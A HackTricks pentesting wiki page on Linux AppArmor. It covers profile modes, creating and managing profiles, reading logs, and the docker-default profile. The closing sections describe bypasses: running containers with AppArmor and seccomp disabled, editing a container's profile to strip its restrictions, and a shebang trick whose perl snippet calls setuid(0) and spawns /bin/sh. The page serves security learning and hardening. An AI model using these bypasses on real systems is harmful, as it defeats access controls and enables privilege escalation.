# AppArmor

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Basic Information

**AppArmor** is a kernel enhancement to confine **programs** to a **limited** set of **resources** with **per-program profiles**. Profiles can **allow** **capabilities** like network access, raw socket access, and the permission to read, write, or execute files on matching paths.

It's a Mandatory Access Control or **MAC** that binds **access control** attributes **to programs rather than to users**.\
AppArmor confinement is provided via **profiles loaded into the kernel**, typically on boot.\
AppArmor profiles can be in one of **two modes**:

* **Enforcement**: Profiles loaded in enforcement mode will result in **enforcement of the policy** defined in the profile **as well as reporting** policy violation attempts (either via syslog or auditd).
* **Complain**: Profiles in complain mode **will not enforce policy** but instead **report** policy **violation** attempts.

AppArmor differs from some other MAC systems on Linux: it is **path-based**, it allows mixing of enforcement and complain mode profiles, it uses include files to ease development, and it has a far lower barrier to entry than other popular MAC systems.

### Parts of AppArmor

* **Kernel module**: Does the actual work
* **Policies**: Defines the behaviour and containment
* **Parser**: Loads the policies into kernel
* **Utilities**: Usermode programs to interact with apparmor

### Profiles path

Apparmor profiles are usually saved in _**/etc/apparmor.d/**_\
With `sudo aa-status` you will be able to list the binaries that are restricted by some profile. If you can change the char "/" for a dot of the path of each listed binary and you will obtain the name of the apparmor profile inside the mentioned folder.

For example, a **apparmor** profile for _/usr/bin/man_ will be located in _/etc/apparmor.d/usr.bin.man_

### Commands

```bash
aa-status     #check the current status 
aa-enforce    #set profile to enforce mode (from disable or complain)
aa-complain   #set profile to complain mode (from diable or enforcement)
apparmor_parser #to load/reload an altered policy
aa-genprof    #generate a new profile
aa-logprof    #used to change the policy when the binary/program is changed
aa-mergeprof  #used to merge the policies
```

## Creating a profile

* In order to indicate the affected executable, **absolute paths and wildcards** are allowed (for file globbing) for specifying files.
* To indicate the access the binary will have over **files** the following **access controls** can be used:
  * **r** (read)
  * **w** (write)
  * **m** (memory map as executable)
  * **k** (file locking)
  * **l** (creation hard links)
  * **ix** (to execute another program with the new program inheriting policy)
  * **Px** (execute under another profile, after cleaning the environment)
  * **Cx** (execute under a child profile, after cleaning the environment)
  * **Ux** (execute unconfined, after cleaning the environment)
* **Variables** can be defined in the profiles and can be manipulated from outside the profile. For example: @{PROC} and @{HOME} (add #include \<tunables/global> to the profile file)
* **Deny rules are supported to override allow rules**.

### aa-genprof

To easily start creating a profile apparmor can help you. It's possible to make **apparmor inspect the actions performed by a binary and then let you decide which actions you want to allow or deny**.\
You just need to run:

```bash
sudo aa-genprof /path/to/binary
```

Then, in a different console perform all the actions that the binary will usually perform:

```bash
/path/to/binary -a dosomething
```

Then, in the first console press "**s**" and then in the recorded actions indicate if you want to ignore, allow, or whatever. When you have finished press "**f**" and the new profile will be created in _/etc/apparmor.d/path.to.binary_

{% hint style="info" %}
Using the arrow keys you can select what you want to allow/deny/whatever
{% endhint %}

### aa-easyprof

You can also create a template of an apparmor profile of a binary with:

```bash
sudo aa-easyprof /path/to/binary
# vim:syntax=apparmor
# AppArmor policy for binary
# ###AUTHOR###
# ###COPYRIGHT###
# ###COMMENT###

#include <tunables/global>

# No template variables specified

"/path/to/binary" {
  #include <abstractions/base>

  # No abstractions specified

  # No policy groups specified

  # No read paths specified

  # No write paths specified
}
```

{% hint style="info" %}
Note that by default in a created profile nothing is allowed, so everything is denied. You will need to add lines like `/etc/passwd r,` to allow the binary read `/etc/passwd` for example.
{% endhint %}

You can then **enforce** the new profile with

```bash
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

### Modifying a profile from logs

The following tool will read the logs and ask the user if he wants to permit some of the detected forbidden actions:

```bash
sudo aa-logprof
```

{% hint style="info" %}
Using the arrow keys you can select what you want to allow/deny/whatever
{% endhint %}

### Managing a Profile

```bash
#Main profile management commands
apparmor_parser -a /etc/apparmor.d/profile.name #Load a new profile in enforce mode
apparmor_parser -C /etc/apparmor.d/profile.name #Load a new profile in complain mode
apparmor_parser -r /etc/apparmor.d/profile.name #Replace existing profile
apparmor_parser -R /etc/apparmor.d/profile.name #Remove profile
```

## Logs

Example of **AUDIT** and **DENIED** logs from _/var/log/audit/audit.log_ of the executable **`service_bin`**:

```bash
type=AVC msg=audit(1610061880.392:286): apparmor="AUDIT" operation="getattr" profile="/bin/rcat" name="/dev/pts/1" pid=954 comm="service_bin" requested_mask="r" fsuid=1000 ouid=1000
type=AVC msg=audit(1610061880.392:287): apparmor="DENIED" operation="open" profile="/bin/rcat" name="/etc/hosts" pid=954 comm="service_bin" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
```

You can also get this information using:

```bash
sudo aa-notify -s 1 -v
Profile: /bin/service_bin
Operation: open
Name: /etc/passwd
Denied: r
Logfile: /var/log/audit/audit.log

Profile: /bin/service_bin
Operation: open
Name: /etc/hosts
Denied: r
Logfile: /var/log/audit/audit.log

AppArmor denials: 2 (since Wed Jan  6 23:51:08 2021)
For more information, please see: https://wiki.ubuntu.com/DebuggingApparmor
```

## Apparmor in Docker

Note how the profile **docker-profile** of docker is loaded by default:

```bash
sudo aa-status
apparmor module is loaded.
50 profiles are loaded.
13 profiles are in enforce mode.
   /sbin/dhclient
   /usr/bin/lxc-start
   /usr/lib/NetworkManager/nm-dhcp-client.action
   /usr/lib/NetworkManager/nm-dhcp-helper
   /usr/lib/chromium-browser/chromium-browser//browser_java
   /usr/lib/chromium-browser/chromium-browser//browser_openjdk
   /usr/lib/chromium-browser/chromium-browser//sanitized_helper
   /usr/lib/connman/scripts/dhclient-script
   docker-default
```

By default **Apparmor docker-default profile** is generated from [https://github.com/moby/moby/tree/master/profiles/apparmor](https://github.com/moby/moby/tree/master/profiles/apparmor)

**docker-default profile Summary**:

* **Access** to all **networking**
* **No capability** is defined (However, some capabilities will come from including basic base rules i.e. #include \<abstractions/base> )
* **Writing** to any **/proc** file is **not allowed**
* Other **subdirectories**/**files** of /**proc** and /**sys** are **denied** read/write/lock/link/execute access
* **Mount** is **not allowed**
* **Ptrace** can only be run on a process that is confined by **same apparmor profile**

Once you **run a docker container** you should see the following output:

```bash
1 processes are in enforce mode.
   docker-default (825)
```

Note that **apparmor will even block capabilities privileges** granted to the container by default. For example, it will be able to **block permission to write inside /proc even if the SYS\_ADMIN capability is granted** because by default docker apparmor profile denies this access:

```bash
docker run -it --cap-add SYS_ADMIN --security-opt seccomp=unconfined ubuntu /bin/bash
echo "" > /proc/stat
sh: 1: cannot create /proc/stat: Permission denied
```

You need to **disable apparmor** to bypass its restrictions:

```bash
docker run -it --cap-add SYS_ADMIN --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu /bin/bash
```

Note that by default **AppArmor** will also **forbid the container to mount** folders from the inside even with SYS\_ADMIN capability.

Note that you can **add/remove** **capabilities** to the docker container (this will be still restricted by protection methods like **AppArmor** and **Seccomp**):

* `--cap-add=SYS_ADMIN` give `SYS_ADMIN` cap
* `--cap-add=ALL` give all caps
* `--cap-drop=ALL --cap-add=SYS_PTRACE` drop all caps and only give `SYS_PTRACE`

{% hint style="info" %}
Usually, when you **find** that you have a **privileged capability** available **inside** a **docker** container **but** some part of the **exploit isn't working**, this will be because docker **apparmor will be preventing it**.
{% endhint %}

### Example

(Example from [**here**](https://sreeninet.wordpress.com/2016/03/06/docker-security-part-2docker-engine/))

To illustrate AppArmor functionality, I created a new Docker profile “mydocker” with the following line added:

```
deny /etc/* w,   # deny write for all files directly in /etc (not in a subdir)
```

To activate the profile, we need to do the following:

```
sudo apparmor_parser -r -W mydocker
```

To list the profiles, we can do the following command. The command below is listing my new AppArmor profile.

```
$ sudo apparmor_status  | grep mydocker
   mydocker
```

As shown below, we get error when trying to change “/etc/” since AppArmor profile is preventing write access to “/etc”.

```
$ docker run --rm -it --security-opt apparmor:mydocker -v ~/haproxy:/localhost busybox chmod 400 /etc/hostname
chmod: /etc/hostname: Permission denied
```

### AppArmor Docker Bypass1

You can find which **apparmor profile is running a container** using:

```bash
docker inspect 9d622d73a614 | grep lowpriv
        "AppArmorProfile": "lowpriv",
                "apparmor=lowpriv"
```

Then, you can run the following line to **find the exact profile being used**:

```bash
find /etc/apparmor.d/ -name "*lowpriv*" -maxdepth 1 2>/dev/null
```

In the weird case you can **modify the apparmor docker profile and reload it.** You could remove the restrictions and "bypass" them.

### AppArmor Docker Bypass2

**AppArmor is path based**, this means that even if it might be **protecting** files inside a directory like **`/proc`** if you can **configure how the container is going to be run**, you could **mount** the proc directory of the host inside **`/host/proc`** and it **won't be protected by AppArmor anymore**.

### AppArmor Shebang Bypass

In [**this bug**](https://bugs.launchpad.net/apparmor/+bug/1911431) you can see an example of how **even if you are preventing perl to be run with certain resources**, if you just create a a shell script **specifying** in the first line **`#!/usr/bin/perl`** and you **execute the file directly**, you will be able to execute whatever you want. E.g.:

```perl
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
